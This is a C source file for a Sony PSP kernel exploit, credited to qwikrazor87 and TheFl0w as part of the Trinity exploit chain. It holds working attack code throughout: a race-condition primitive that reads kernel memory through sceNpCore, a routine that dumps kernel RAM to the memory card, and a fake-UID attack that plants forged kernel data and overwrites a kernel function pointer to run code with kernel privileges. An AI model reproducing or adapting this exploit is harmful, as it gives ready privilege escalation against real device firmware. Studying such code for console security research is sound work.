#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psputility_htmlviewer.h>
#include <psploadexec.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <pspsysmem.h>
#include <psppower.h>
#include <string.h>

#include "macros.h"
#include "globals.h"
#include "functions.h"
#include "kxploit.h"

/*
SceUID kernel exploit by qwikrazor87.
Read only kernel exploit by TheFl0w.
Part of Trinity exploit chain.
*/


#define DUMP_PATH "ms0:/kram.bin"
#define BUF_SIZE 10*1024 // 10KB buffer to minimize IO

#define LIBC_CLOCK_OFFSET  0x88014D80 //0x88014D00
#define SYSMEM_SEED_OFFSET 0x88014EB8 //0x88014E38
#define FAKE_UID_OFFSET    0x8814CFA8

FunctionTable* g_tbl;
int (*_sceNpCore_8AFAB4A0)(int *input, char *string, int length);

/* Actual code to trigger the kram read vulnerability.
	We can read the value stored at any location in Kram.
*/
static volatile int running;
static volatile int idx;
static int input[3];

static int racer(SceSize args, void *argp) {
  running = 1;

  while (running) {
    input[1] = 0;
    g_tbl->KernelDelayThread(10);
    input[1] = idx;
    g_tbl->KernelDelayThread(10);
  }

  return g_tbl->KernelExitDeleteThread(0);
}
u32 readKram(u32 addr){
  SceUID thid = g_tbl->KernelCreateThread("", racer, 8, 0x1000, 0, NULL);
  if (thid < 0)
    return 0;

  g_tbl->KernelStartThread(thid, 0, NULL);

  char string[8];
  int round = 0;

  idx = -83; // relative offset 0xB00 in np_core.prx (0xD98 + (-83 << 3))

  int i;
  for (i = 0; i < 100000; i++) {
    u32 res = _sceNpCore_8AFAB4A0(input, string, sizeof(string));
    if (res != 5 && res != 0x80550203) {
      switch (round) {
        case 0:
          round = 1;
          idx = (addr - (res - 0xA74) - 0xD98) >> 3;
          break;
        case 1:
          running = 0;
          return res;
      }
    }
  }

  running = 0;
  return 0;
}

void dumpKram(){
	SceUID fd = g_tbl->IoOpen(DUMP_PATH, PSP_O_CREAT | PSP_O_TRUNC | PSP_O_WRONLY, 0777);
	if (fd < 0){
		return;
	}
	
	u32 kptr = 0x88000000;
	u32 size = 0x400000;
	u32 i;
	static u32 buf[BUF_SIZE];
	u32 count = 0;
	for (i=0; i<size; i+=4){
		u32 val = readKram((void*)(kptr+i));
		if (count >= BUF_SIZE){
			count = 0;
			g_tbl->IoWrite(fd, buf, sizeof(buf));
		}
		buf[count++] = val;
	}
	if (count > 0){
		g_tbl->IoWrite(fd, buf, count*sizeof(u32));
	}
	g_tbl->IoClose(fd);
}

void repairInstruction(KernelFunctions* k_tbl) {
    SceModule2 *mod = k_tbl->KernelFindModuleByName("sceRTC_Service");
    _sw(mod->text_addr + 0x3904, LIBC_CLOCK_OFFSET);
    k_tbl->KernelIcacheInvalidateAll();
    k_tbl->KernelDcacheWritebackInvalidateAll(); 
}

int stubScanner(FunctionTable* tbl){
    g_tbl = tbl;
    
    if (g_tbl->UtilityLoadModule(PSP_MODULE_NP_COMMON) < 0)
        return -1;

    if (g_tbl->UtilityLoadModule(PSP_MODULE_NET_COMMON) < 0)
        return -2;

    if (g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET) < 0)
        return -3;
    
    _sceNpCore_8AFAB4A0 = tbl->FindImportUserRam("sceNpCore", 0x8AFAB4A0);
    if (_sceNpCore_8AFAB4A0 == NULL) return -4;
    
    return 0;
}

/*
FakeUID kxploit
*/

int doExploit(void) {

    //PRTSTR("Dumping kram");
    //dumpKram();
    //PRTSTR("kram dumped");

    int res;

    u32 seed = readKram(SYSMEM_SEED_OFFSET);
    PRTSTR1("Seed: %p", seed);
    if (!seed)
        return -1;

    SceUID uid = (((FAKE_UID_OFFSET & 0x00ffffff) >> 2) << 7) | 0x1;
    SceUID encrypted_uid = uid ^ seed;

    // Allocate dummy block to improve reliability
    char dummy[32];
    memset(dummy, 'a', sizeof(dummy));
    SceUID dummyid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, dummy, PSP_SMEM_Low, 0x10, NULL);

    // Plant UID data structure into kernel as string
    u32 string[] = { LIBC_CLOCK_OFFSET - 4, 0x88888888, 0x88016dc0, encrypted_uid, 0x88888888, 0x10101010, 0, 0 };
    SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)&string, PSP_SMEM_Low, 0x10, NULL);

    for (u32 a=0x88010000; a<0x88017000; a+=4){
        u32 data = readKram(SYSMEM_SEED_OFFSET);
        if (data == encrypted_uid){
            PRTSTR1("Found fake uid at: %p", a);
        }
        else if (data == 0x61616161){
            PRTSTR1("Found dummy block at: %p", a);
        }
    }

    g_tbl->KernelDcacheWritebackAll();

    // Overwrite function pointer at LIBC_CLOCK_OFFSET with 0x88888888
    res = g_tbl->KernelFreePartitionMemory(uid);

    g_tbl->KernelFreePartitionMemory(plantid);
    g_tbl->KernelFreePartitionMemory(dummyid);

    g_tbl->UtilityUnloadModule(PSP_MODULE_NET_INET);
    g_tbl->UtilityUnloadModule(PSP_MODULE_NET_COMMON);
    g_tbl->UtilityUnloadModule(PSP_MODULE_NP_COMMON);

    if (res < 0)
        return res;
        
    return 0;
}

void executeKernel(u32 kernelContentFunction){
  // Make a jump to kernel function
  _sw(JUMP(KERNELIFY(kernelContentFunction)), 0x08888888);
  _sw(NOP, 0x08888888+4);
  g_tbl->KernelDcacheWritebackAll();

  // Execute kernel function
  g_tbl->KernelLibcClock();
}

